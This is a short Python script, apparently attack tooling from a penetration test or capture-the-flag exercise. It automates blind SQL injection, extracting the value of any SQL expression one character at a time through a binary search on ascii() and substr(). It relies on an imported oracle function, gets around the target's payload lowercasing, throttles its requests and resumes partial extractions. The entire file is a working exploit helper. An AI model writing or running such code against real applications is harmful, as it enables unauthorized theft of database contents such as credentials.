"""Case-exact blind extractor using ascii() (immune to the app's payload lowercasing).

Usage: python extract_case.py "<sql scalar expression>" <outfile> [first] [last]
"""
import os
import sys
import time
from cmdexec import bit

GAP = 1.2
EXPR = sys.argv[1]
OUT = sys.argv[2]
FIRST = int(sys.argv[3]) if len(sys.argv) > 3 else 1
LAST = int(sys.argv[4]) if len(sys.argv) > 4 else 22


def byte_at(i):
    e = "(SELECT ascii(substr((%s),%d,1)))" % (EXPR, i)
    if not bit("(%s)>0" % e):
        return ""
    lo, hi = 1, 127
    while lo < hi:
        mid = (lo + hi + 1) // 2
        time.sleep(GAP)
        if bit("(%s)>=%d" % (e, mid)):
            lo = mid
        else:
            hi = mid - 1
    return chr(lo)


have = open(OUT).read() if os.path.exists(OUT) else ""
f = open(OUT, "a")
for i in range(FIRST + len(have), LAST + 1):
    c = byte_at(i)
    f.write(c)
    f.flush()
    os.fsync(f.fileno())
    sys.stdout.write("\r[%d/%d] %s" % (i - FIRST + 1, LAST - FIRST + 1, open(OUT).read()))
    sys.stdout.flush()
    time.sleep(GAP)
print("\n[+] %s = %r" % (OUT, open(OUT).read()), flush=True)
